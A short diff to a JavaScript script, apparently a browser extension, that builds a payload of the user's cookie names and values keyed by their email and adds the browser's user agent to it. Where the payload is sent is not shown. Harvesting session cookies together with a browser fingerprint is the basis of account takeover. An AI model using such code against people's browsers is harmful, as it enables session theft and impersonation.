@@ -162,6 +162,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       // 2. Prepare payload — profileName = email
       const payload = {
         profileName: email,
+        userAgent: navigator.userAgent,
         cookies: cookies.map(c => ({
           name: c.name,
           value: c.value,
